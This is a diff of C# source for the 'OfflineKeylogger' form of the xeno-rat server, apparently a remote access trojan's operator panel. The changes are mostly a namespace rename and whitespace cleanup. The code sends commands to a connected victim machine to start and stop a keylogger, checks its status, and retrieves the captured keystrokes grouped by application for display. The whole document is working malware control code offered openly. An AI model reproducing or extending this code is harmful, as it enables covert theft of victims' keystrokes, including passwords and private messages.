@@ -8,13 +8,14 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace xeno_rat_server.Forms
+namespace XenoRatServer.Forms
 {
     public partial class OfflineKeylogger : Form
     {
         Node client;
         bool started = false;
         Dictionary<string, string> applications = new Dictionary<string, string>();
+
         public OfflineKeylogger(Node _client)
         {
             client = _client;
@@ -23,7 +24,7 @@ namespace xeno_rat_server.Forms
             InitializeAsync();
         }
 
-        private void OnTempDisconnect(Node node) 
+        private void OnTempDisconnect(Node node)
         {
             if (this.IsDisposed) return;
             MessageBox.Show("Socket closed!");
@@ -35,14 +36,13 @@ namespace xeno_rat_server.Forms
                 }));
             }
             catch { }
-            
         }
 
-        private async Task<bool> IsStarted() 
+        private async Task<bool> IsStarted()
         {
             await client.SendAsync(new byte[] { 0 });
             byte[] data = await client.ReceiveAsync();
-            if (data == null || data.Length != 1) 
+            if (data == null || data.Length != 1)
             {
                 client.Disconnect();
                 return false;
@@ -50,10 +50,10 @@ namespace xeno_rat_server.Forms
             return data[0] == 1;
         }
 
-        private async Task InitializeAsync() 
+        private async Task InitializeAsync()
         {
-            byte[] data=await client.ReceiveAsync();
-            if (data == null||data.Length!=1||data[0]!=1) 
+            byte[] data = await client.ReceiveAsync();
+            if (data == null || data.Length != 1 || data[0] != 1)
             {
                 if (this.IsDisposed) return;
                 MessageBox.Show("There was an error!");
@@ -61,17 +61,15 @@ namespace xeno_rat_server.Forms
                 {
                     this.BeginInvoke((MethodInvoker)(() =>
                     {
-
                         this.Close();
                     }));
                 }
                 catch { }
-                
             }
             await UpdateStatus();
         }
 
-        private async Task StartKeylogger() 
+        private async Task StartKeylogger()
         {
             await client.SendAsync(new byte[] { 1 });
         }
@@ -81,7 +79,7 @@ namespace xeno_rat_server.Forms
             await client.SendAsync(new byte[] { 2 });
         }
 
-        private async Task<Dictionary<string, string>> GetKeylogs() 
+        private async Task<Dictionary<string, string>> GetKeylogs()
         {
             Dictionary<string, string> retval = new Dictionary<string, string>() { };
             await client.SendAsync(new byte[] { 3 });
@@ -91,25 +89,25 @@ namespace xeno_rat_server.Forms
                 client.Disconnect();
                 return retval;
             }
-            try 
+            try
             {
                 return ConvertBytesToDictionary(data, 0);
-            } 
-            catch 
+            }
+            catch
             {
                 return retval;
             }
         }
 
-        private async Task UpdateStatus() 
+        private async Task UpdateStatus()
         {
             started = await IsStarted();
             label3.BeginInvoke((MethodInvoker)(() =>
             {
                 label3.Text = "Status: " + started.ToString();
             }));
-            
         }
+
         public string Normalize(string input)
         {
             return input.Replace("[enter]", Environment.NewLine).Replace("[space]", " ");
@@ -149,10 +147,8 @@ namespace xeno_rat_server.Forms
             return dictionary;
         }
 
-
         private void OfflineKeylogger_Load(object sender, EventArgs e)
         {
-
         }
 
         private void listView1_ItemActivate(object sender, EventArgs e)
@@ -179,8 +175,8 @@ namespace xeno_rat_server.Forms
         private async void button3_Click(object sender, EventArgs e)
         {
             await UpdateStatus();
-            Dictionary<string,string> data=await GetKeylogs();
-            if (data.Count == 0) 
+            Dictionary<string, string> data = await GetKeylogs();
+            if (data.Count == 0)
             {
                 return;
             }
@@ -198,7 +194,6 @@ namespace xeno_rat_server.Forms
                 }));
             }
             catch { }
-
         }
     }
 }
